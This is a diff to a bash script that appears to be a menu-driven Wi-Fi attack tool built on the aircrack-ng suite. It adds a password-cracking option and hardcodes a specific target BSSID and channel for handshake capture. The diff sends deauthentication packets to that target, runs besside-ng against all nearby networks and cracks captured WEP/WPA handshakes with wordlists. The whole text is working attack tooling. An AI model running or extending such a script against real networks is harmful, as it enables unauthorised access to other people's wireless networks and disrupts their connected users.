@@ -149,7 +149,8 @@ done
 echo -e "\n${Yellow}                      [ Select Option To Continue ]\n\n"
 echo -e "      ${Red}[${Blue}1${Red}] ${Green}Hack A Network"
 echo -e "      ${Red}[${Blue}2${Red}] ${Green}Hack All Networks"
-echo -e "      ${Red}[${Blue}3${Red}] ${Green}Exit\n\n"
+echo -e "      ${Red}[${Blue}3${Red}] ${Green}Decrypt Passowrd"
+echo -e "      ${Red}[${Blue}4${Red}] ${Green}Exit\n\n"
 while true; do
 echo -e "${Green}┌─[${Red}Select Option${Green}]──[${Red}~${Green}]─[${Yellow}Menu${Green}]:"
 read -p "└─────►$(tput setaf 7) " option
@@ -161,7 +162,11 @@ case $option in
      attackAll
      exit 0
      ;;
-  3) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
+  3) echo -e "\n[${Green}Selected${White}] Option 3 Crack Password.."
+     crack
+     exit 0
+     ;;
+  4) echo -e "${Red}\n\033[1mThank You for using the script,\nHappy Hacking :)\n"
      exit 0
      ;;
   *) echo -e "${White}[${Red}Error${White}] Please select correct option...\n"
@@ -175,63 +180,16 @@ done
 AirScript() {
 ./raspberry.sh
 monitor
-airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake wlan0mon > /dev/null &
+#sudo airodump-ng --bssid $bssid --channel $channel --output-format pcap --write handshake wlan0mon > /dev/null &
+sudo airodump-ng --bssid 30:B5:C2:9A:64:12 --channel 9 --output-format pcap --write handshake wlan0mon > /dev/null &
 echo -e "[${Green}wlan0mon${White}] Sending DeAuth to target..."
-x-terminal-emulator -e aireplay-ng --deauth 20 -a $bssid wlan0mon
-wordlist
-echo -e "[${Green}Status${White}] Waiting for Handshake Packet..."
-counter=0
-while true; do
-sleep 10
-echo -e "[${Green}Status${White}] Checking for Handshake Packet..."
-aircrack-ng -w $fileLocation handshake-01.cap > logs/password 2> logs/error
-if [ $? -eq 0 ] || [ $counter -eq $(($handshakeWait*3)) ]; then
-break
-fi
-sleep 10
-echo -e "[${Red}!${White}] Can't find Handshake, waiting ..."
-counter=$((counter+1))
-done
-kill $!
-sudo airmon-ng stop wlan0mon > /dev/null
-#rm handshake-01.cap
-if grep "unable" logs/error > /dev/null; then
-echo -e "[${Red}$targetName${White}] Exiting can't find Handshake Packet..."
-sleep 0.5
-echo -e "[${Yellow}Warning${White}] Make sure at least one client is connected to network..."
-exit 1
-elif grep "NOT" logs/password > /dev/null; then
-echo -e "[${Green}$targetName${White}] Captured Handshake..."
-sleep 0.5
-echo -e "[${Red}$targetName${White}] Can't find password..."
-sleep 0.5
-echo -e "[${Yellow}Warning${White}] Try using custom wordlist..."
-exit 1
-elif grep "FOUND!" logs/password > /dev/null; then
-key=$(grep "FOUND!" logs/password | cut -d " " -f4 | uniq)
-echo -e "[${Green}$targetName${White}] Captured Handshake..."
-sleep 0.5
-echo -e "[${Green}$targetName${White}] Password for network is: \e[4;97m$key${White}\n"
-exit 0
-else
-echo -e "[${Red}!${White}] Unknown error is occured..."
-sleep 0.5
-echo -e "[${Yellow}GitHub${White}] You can email me at liam@liambendix.com"
-echo -e "[${Yellow}GitHub${White}] Please send a copy of password and error log files..."
-exit 1
-fi
-}
-
-wordlist () {        ##### Enter path to wordlist or use default #####
-read -p $'[\e[0;92mInput\e[0;97m] Path to wordlist (Press enter to use default): ' fileLocation
-if [ -z "$fileLocation" ]; then
-fileLocation="${parameter:-dictionary/defaultWordList.txt}"
-return 0
-elif [[ -f "$fileLocation" ]]; then
-return 0
-fi
-echo -e "[${Red}!$White] File doesn't exist..."
-wordlist
+#sudo aireplay-ng --deauth 20 -a $bssid wlan0mon
+sudo aireplay-ng --deauth 20 -a 30:B5:C2:9A:64:12 wlan0mon
+sudo chmod -R 755 air-crack
+sudo airmon-ng stop wlan0mon
+sudo ifconfig wlan0 up
+sudo systemctl start NetworkManager
+echo -e "[${Green}Status${White}] Done! Select 3 to crack captured passowrd or select 4 to exit.."
 }
 
 
@@ -241,10 +199,11 @@ sudo airmon-ng check kill
 sudo airmon-ng
 sudo airmon-ng start wlan0
 sudo besside-ng wlam0mon
-sudo besside-ng wlan0mon
 sudo airmon-ng stop wlan0mon
 sudo ifconfig wlan0 up
 sudo systemctl start NetworkManager
+sudo chmod -R 755 air-crack
+echo -e "[${Green}Status${White}] Done! Select 4 to exit..."
 }
 
 
@@ -265,7 +224,7 @@ sudo ./Wifite.py
 }
 
 crack() {
-wordlist
+chmod -R 755 air-script
 sudo aircrack-ng -w wordlist.txt wep.cap
 sudo aircrack-ng -w wordlist.txt wpa.cap
 sudo aircrack-ng -a2 -w wordlist.txt *.cap
@@ -286,7 +245,7 @@ aireplay-ng --deauth 0 -a $bssid wlan0mon > /dev/null
 monitor () {        ##### Monitor mode, scan available networks & select target #####
 spinner &
 airmon-ng start wlan0 > /dev/null
-trap "airmon-ng stop wlan0mon > /dev/null;rm generated-01.kismet.csv handshake-01.cap 2> /dev/null" EXIT
+trap "airmon-ng stop wlan0mon > /dev/null;rm generated-01.kismet.csv 2> /dev/null" EXIT 
 airodump-ng --output-format kismet --write generated wlan0mon > /dev/null & sleep 20 ; kill $!
 sed -i '1d' generated-01.kismet.csv
 kill %1
